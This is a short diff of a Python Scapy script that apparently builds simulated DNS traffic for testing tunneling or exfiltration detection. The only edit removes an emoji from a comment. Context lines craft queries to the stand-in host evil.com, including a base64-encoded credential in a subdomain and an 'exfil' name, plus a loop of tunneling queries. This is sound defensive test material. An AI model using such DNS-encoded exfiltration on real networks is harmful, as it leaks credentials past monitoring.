@@ -10,7 +10,7 @@ packets.append(IP(dst="8.8.8.8", src="192.168.1.11")/UDP(dport=53)/DNS(rd=1,qd=D
 packets.append(IP(dst="8.8.8.8", src="192.168.1.12")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="QWxhZGRpbjpvcGVuIHNlc2FtZQ==.evil.com")))
 packets.append(IP(dst="8.8.8.8", src="192.168.1.13")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="exfil.evil.com")))
 
-# 🔥 Noisy host: simulate tunneling with 100 queries
+# Noisy host: simulate tunneling with 100 queries
 for i in range(100):
     packets.append(
         IP(dst="8.8.8.8", src="192.168.1.99")/
